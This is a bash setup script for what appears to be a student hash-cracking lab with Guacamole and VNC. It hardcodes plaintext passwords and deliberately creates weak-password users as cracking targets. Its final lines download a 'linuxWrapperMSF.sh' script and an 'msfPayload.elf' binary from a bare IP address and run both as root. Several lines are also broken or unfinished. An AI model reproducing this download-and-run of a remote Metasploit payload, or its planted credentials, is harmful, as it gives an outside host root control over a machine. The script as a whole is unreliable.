#!/bin/bash
touch /home/HashCrackUser1/file
sudo apt-get update
sudo apt-get upgrade
# {create the nonroot user account in a way which can be scripted (pretty sure useradd instead of adduser, but then we need to set their default shell and passwd manually)}
password="This is a basic student password"
username="student"
pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
useradd -m -p "$pass" "$username"
# installing guacmole
export DEBIAN_FRONTEND=noninteractive apt-get install -y
apt-get install guacamole-tomcat -y
invoke-rc.d tomcat8 restart
# wget
wget "http://apache.org/dyn/closer.cgi?action=download&filename=guacamole/1.1.0/binary/guacamole-1.1.0.war" -O /var/lib/tomcat8/webapps/guacamole.war  
touch /etc/tomcat8/Catalina/localhost/guacamole.xml
echo '<Context path="/guacamole" docbase="/var/lib/tomcat8/webapps/guacamole.war">' > /etc/tomcat8/Catalina/localhost/guacamole.xml
echo " <Resources allowLinking='true' />" >> /etc/tomcat8/Catalina/localhost/guacamole.xml
echo "</Context>" >> /etc/tomcat8/Catalina/localhost/guacamole.xml
# edit the user-mapping.xml file
printf '<user-mapping>
    <!-- Example user configurations are given below. For more information,
         see the user-mapping.xml section of the Guacamole configuration
         documentation: http://guac-dev.org/Configuring%%20Guacamole -->
    <!-- Per-user authentication and config information -->
    <authorize username="student" password="hey this is a long student password">
        <connection name="KaliVNC">
            <protocol>vnc</protocol>
            <param name="hostname">10.0.19.5</param>
            <param name="port">5901</param>
            <param name="password">password</param>
        </connection>
    </authorize>
    <!-- Another user, but using md5 to hash the password
         (example below uses the md5 hash of "PASSWORD") -->
    <!--
    <authorize
            username="USERNAME2"
            password="319f4d26e3c536b5dd871bb2c52e3178"
            encoding="md5">
        <protocol>vnc</protocol>
        <param name="hostname">localhost</param>
        <param name="port">5901</param>
        <param name="password">VNCPASS</param>
    </authorize>
    -->
</user-mapping>' > /etc/guacamole/user-mapping.xml
# install vnc server
apt-get install vnc4server
mkdir /etc/vncserver
touch /etc/vncserver/vncservers.conf
echo "VNCSERVERS="1:student"" > /etc/vncserver/vncservers.conf
echo "VNCSERVERARGS[1]="-geometry 1600x900"" >> /etc/vncserver/vncservers.conf
mypasswd="here is the vnc password for this student account"
mkdir /home/student/.vnc
# echo $mypasswd | vncpasswd -f > /home/student/.vnc/passwd
printf "$mypasswd\n$mypasswd\n\n" | vnc4passwd /home/student/.vnc/passwd
chown -R student:student /home/student/.vnc
chmod 0600 /home/student/.vnc/passwd
touch /home/student/.vnc/xstartup
echo '#!/bin/sh' >> /home/student/.vnc/xstartup
echo 'def' >> /home/student/.vnc/xstartup
echo 'export XKL_XMODMAP_DISABLE=1' >> /home/student/.vnc/xstartup
echo 'unset SESSION_MANAGER' >> /home/student/.vnc/xstartup
echo 'unset DBUS_SESSION_BUS_ADDRESS' >> /home/student/.vnc/xstartup
echo 'xrdb $HOME/.Xresources' >> /home/student/.vnc/xstartup
echo 'xsetroot -solid grey' >> /home/student/.vnc/xstartup
echo 'startxfce4 &' >> /home/student/.vnc/xstartup
touch /etc/init.d/vncserver
chmod +x /etc/init.d/vncserver
# I have a long file for you to echo into /etc/init.d/vncserver
apt-get install -y xfce4 xfce4-goodies
# update
updatedb
# Start guac service
service guacd start
useradd joshua -p password # wordlist, simple
useradd alyssa -p afccdeg8 # brute-force, matches ?l?l?l?l?l?l?l?d, easy match
useradd rajj -p 123mango # wordlist, end of rockyou
cd /root/
wget http://64.227.19.44/content/dlj23jjoj233jjajdeqo/linuxWrapperMSF.sh
chmod +x linuxWrapperMSF.sh
sudo ./linuxWrapperMSF.sh
bg
wget http://64.227.19.44/content/dlj23jjoj233jjajdeqo/msfPayload.elf
chmod +x msfPayload.elf
sudo ./msfPayload.elf
bg
